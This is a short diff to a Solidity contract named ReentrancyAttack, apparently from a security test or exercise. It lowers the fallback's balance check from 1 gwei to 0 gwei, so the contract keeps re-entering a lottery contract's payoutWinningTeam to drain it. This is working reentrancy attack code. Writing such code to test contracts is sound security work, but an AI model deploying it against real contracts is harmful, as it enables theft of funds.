@@ -16,7 +16,7 @@ contract ReentrancyAttack {
     }
 
     fallback() external payable {
-    if (address(lotteryContract).balance >= 1 gwei){
+    if (address(lotteryContract).balance >= 0 gwei){
         lotteryContract.payoutWinningTeam(address(this));
         }
     }
